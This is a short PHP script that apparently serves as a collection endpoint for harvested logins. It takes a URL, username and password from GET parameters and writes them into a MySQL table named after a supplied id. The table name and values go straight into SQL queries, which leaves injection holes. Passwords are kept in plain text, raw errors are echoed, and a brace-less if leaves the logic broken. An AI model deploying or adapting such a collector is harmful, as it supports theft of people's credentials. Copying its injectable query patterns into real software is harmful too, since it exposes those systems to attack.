<?php
	include_once 'sql.php';

if( $_GET["id"] || $_GET["url"] || $_GET["username"] || $_GET["password"])
$hek = $_GET["id"];
$url = $_GET["url"];
$user = $_GET["username"];
$pass = $_GET["password"];

{
  
    $query = "SELECT * FROM $hek";
	$result = mysqli_query($conn, $query);
	if(empty($result)) {
    	            $sql = "CREATE TABLE $hek (
                          url varchar(999) NOT NULL,
                          username varchar(999) NOT NULL,
                          password varchar(999) NOT NULL
                          );";
                	$res = mysqli_query($conn, $sql);
                	echo $res;
                	

            }

$sql = "INSERT INTO $hek (url, username, password) VALUES ('$url', '$user', '$pass')";   

        }
        if ($conn->query($sql) === TRUE) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?>

